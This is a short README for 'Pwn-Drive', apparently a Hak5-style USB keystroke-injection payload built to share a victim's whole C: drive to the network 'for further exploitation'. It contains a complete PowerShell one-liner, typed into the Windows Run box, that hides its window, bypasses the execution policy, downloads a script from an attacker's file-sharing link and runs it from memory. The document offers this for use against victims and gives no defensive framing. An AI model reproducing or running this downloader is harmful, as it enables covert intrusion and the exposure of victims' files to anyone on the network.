# Pwn-Drive

A payload to share the victims "C:" drive to the network.

## Description

This payload will share the entire victims "C:" drive to the entire network for further exploitation.

## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; iex $pl

## Contributing

All contributors names will be listed here

atomiczsec
I am Jakoby

## Version History

* 0.1
    * Initial Release


## Acknowledgments

* [Hak5]
* [I-Am-Jakoby]